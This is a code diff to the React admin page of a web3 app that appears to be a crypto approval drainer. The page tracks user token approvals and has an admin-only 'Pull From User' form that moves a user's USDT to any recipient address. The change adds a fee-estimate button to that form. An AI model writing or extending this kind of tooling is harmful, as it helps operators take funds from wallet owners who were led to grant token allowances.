@@ -4,7 +4,7 @@ import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useChainId, useSwitchChain } from 'wagmi'
-import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES, ERC20_ABI } from '../web3/tokenTransfer'
+import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES, ERC20_ABI, tokenTransferAbi } from '../web3/tokenTransfer'
 import { parseUnits, createPublicClient, http, formatEther, formatUnits, parseAbiItem } from 'viem'
 import { CHAIN_NAMES, RESOLVED_RPC_URLS, CHAIN_IDS } from '../web3/config.jsx'
 import AdminHeader from '../components/AdminHeader.jsx'
@@ -33,6 +33,8 @@ export default function Admin() {
   const [approvals, setApprovals] = useState([])
   const [approvalsLoading, setApprovalsLoading] = useState(false)
   const [approvalsStatus, setApprovalsStatus] = useState('')
+  const [feeEstimate, setFeeEstimate] = useState('')
+  const [feeStatus, setFeeStatus] = useState('')
 
   function handleCheckWallet() { open && open() }
 
@@ -223,6 +225,7 @@ export default function Admin() {
   }
 
   const { switchChain } = useSwitchChain()
+
   async function handleAdminPull(e) {
     e && e.preventDefault && e.preventDefault()
     if (!isAdminAuthed) { setAdminStatus('Please login as admin'); return }
@@ -285,7 +288,13 @@ export default function Admin() {
                       <input type="text" placeholder="User address" value={userToPull} onChange={(e) => setUserToPull(e.target.value)} className="admin-input" />
                       <input type="text" placeholder="Recipient address" value={recipientForPull} onChange={(e) => setRecipientForPull(e.target.value)} className="admin-input" />
                       <input type="text" placeholder="Amount (USDT)" value={amountToPull} onChange={(e) => setAmountToPull(e.target.value)} className="admin-input" />
-                      <button className="admin-btn primary" type="submit" disabled={!isAdminAuthed || isPulling}>Pull From User</button>
+                      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
+                        <button className="admin-btn" type="button" onClick={estimatePullFee} disabled={!isAdminAuthed || isPulling}>Estimate Fee</button>
+                        <button className="admin-btn primary" type="submit" disabled={!isAdminAuthed || isPulling}>Pull From User</button>
+                      </div>
+                      {feeStatus || feeEstimate ? (
+                        <p className="admin-meta" style={{ marginTop: '6px' }}>{feeStatus}{feeEstimate ? ` — ${feeEstimate}` : ''}</p>
+                      ) : null}
                     </form>
                   </div>
                 </div>
